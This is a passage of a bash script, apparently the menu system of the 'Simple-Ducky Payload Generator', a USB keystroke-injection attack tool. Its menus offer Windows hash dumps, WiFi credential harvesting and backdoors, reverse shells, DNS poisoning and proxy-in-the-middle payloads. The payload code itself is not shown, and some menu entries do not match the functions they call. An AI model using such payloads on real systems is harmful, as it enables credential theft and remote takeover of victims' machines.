	echo "8. WiFi Autoconnect w/o UAC (Designed for the WiFi Pineapple | Win 8)"
	echo "9. Return to Main Menu"	
	echo "10.Quit"
	echo ""
	read -p "Option: " option

	case $option in
	1) f_wifibackdoorVIS7uac ;;
	2) f_wifibackdoorVIS7nouac ;;
	3) f_wifibackdoorWIN8uac ;;
	4) f_wifibackdoorWIN8nouac ;;
	5) f_wifiautoconnectVIS7uac ;;
	6) f_wifiautoconnectVIS7nouac ;;
	7) f_wifiautoconnectWIN8uac ;;
	8) f_wifiautoconnectWIN8nouac ;;
	9) f_mainmenu ;;
	10) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Password Attacks - Banner
#################################################################################
f_passwordbanner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Awww... The power of credential harvesting."
	echo -e "If you would like to contribute your payload contact the author at skysploit@gmail.com"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo -e ""
}

#################################################################################
# Password Attacks - Options
################################################################################
f_passwordmenu(){

f_passwordbanner
	echo -e "\e[1;34mWhat payload would you like to use?\e[0m"
	echo ""
	echo "1. LM/NTLM Hash Dump From Live System w/UAC (Win Vista/7)"
	echo "2. LM/NTLM Hash Dump From Live System w/o UAC (Win Vista/7)"
	echo "3. LM/NTLM Hash Dump From Live System w/UAC (Win 8)"
	echo "4. LM/NTLM Hash Dump From Live System w/o UAC (Win 8)"
	echo "5. WiFi Acess Point Crediential Harvester w/UAC (Win Vista/7)"
	echo "6. WiFi Acess Point Crediential Harvester w/o UAC (Win Vista/7)"
	echo "7. WiFi Acess Point Crediential Harvester w/UAC (Win 8)"
	echo "8. WiFi Acess Point Crediential Harvester w/o UAC (Win 8)"
	echo "9. Return to Main Menu"	
	echo "10.Quit"
	echo ""
	read -p "Option: " option

	case $option in
	1) f_livehashVIS7uac ;;
	2) f_livehashVIS7nouac ;;
	3) f_livehashWIN8uac ;;
	4) f_livehashWIN8nouac ;;
	5) f_wifunVIS7uac ;;
	6) f_wifunVIS7nouac ;;
	7) f_wifunWIN8uac ;;
	8) f_wifunWIN8nouac ;;
	9) f_mainmenu ;;
	10) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Linux & OSX - Banner
#################################################################################
f_linuxosxbanner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Not much here but they work"
	echo -e "If you would like to contribute your payload contact the author at skysploit@gmail.com"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) "
	echo -e ""
}

#################################################################################
# Linux & OSX - Options
#################################################################################
f_linuxosxmenu(){

f_linuxosxbanner
	echo -e "\e[1;34mWhat payload would you like to use?\e[0m"
	echo ""
	echo "1. OSX Reverse Shell"
	echo "2. OSX Single User Mode Reverse Shell"
	echo "3. Linux Reverse Shell"
	echo "4. Return to Main Menu"
	echo "5. Quit"
	echo ""
	read -p "Option: " option

	case $option in	
	1) f_osxrev ;;
	2) f_osxsingleuserrev ;;
	3) f_linuxrev ;;
	4) f_mainmenu ;;
	5) clear;exit ;;
	*) clear;exit ;;
	esac

}

#################################################################################
# Forced Phishing / Web Attacks - Banner
#################################################################################
f_forcedphishbanner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Forced Phishing, because they don't have an option..."
	echo -e "If you would like to contribute your payload contact the author at skysploit@gmail.com"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo -e ""
}

#################################################################################
# Forced Phishing / Web Attacks - Options
################################################################################
f_forcedphishmenu(){

f_forcedphishbanner
	echo -e "\e[1;34mWhat payload would you like to use?\e[0m"
	echo ""
	echo "1. Local DNS Poisoning | SE-Toolkit w/UAC (Win Vista/7)"
	echo "2. Local DNS Poisoning | SE-Toolkit w/o UAC (Win Vista/7)"
	echo "3. Local DNS Poisoning | SE-Toolkit w/UAC (Win 8)"
	echo "4. Local DNS Poisoning | SE-Toolkit w/o UAC (Win 8)"
	echo "5. Local DNS Poisoning | Browser_Autopwn w/UAC (Win Vista/7)"
	echo "6. Local DNS Poisoning | Browser_Autopwn w/o UAC (Win Vista/7)"
	echo "7. Local DNS Poisoning | Browser_Autopwn w/UAC (Win 8)"
	echo "8. Local DNS Poisoning | Browser_Autopwn w/o UAC (Win 8)"
	echo "9. Proxy in the Middle (PiTM) | No Admin Needed (Win XP/Vista/7)"
	echo "10.Proxy in the Middle (PiTM) | No Admin Needed (Win 8)"
	echo "13.Return to Main Menu"	
	echo "14.Quit"
	echo ""
	read -p "Option: " option

	case $option in
	1) f_setlocaldnsVIS7uac ;;
	2) f_setlocaldnsVIS7nouac ;;
	3) f_setlocaldnsWIN8uac ;;
	4) f_autopwnlocaldnsWIN8nouac ;;
	5) f_autopwnlocaldnsVIS7uac ;;
	6) f_autopwnlocaldnsVIS7nouac ;;
	7) f_autopwnlocaldnsWIN8uac ;;
	8) f_autopwnlocaldnsWIN8nouac ;;
	9) f_proxyinthemiddleXPVIS7 ;;
	10) f_proxyinthemiddleWIN8 ;;
	11) f_wifunWIN8uac ;;
	12) f_wifunWIN8nouac ;;
	13) f_mainmenu ;;
	14) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# Run as Root Query
#################################################################################
#!/bin/bash
resize -s 35 115
cd /usr/share/ducky/encoder
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!] This script must be run as root\e[0m" 1>&2
	exit 1
else
	f_mainmenu
fi
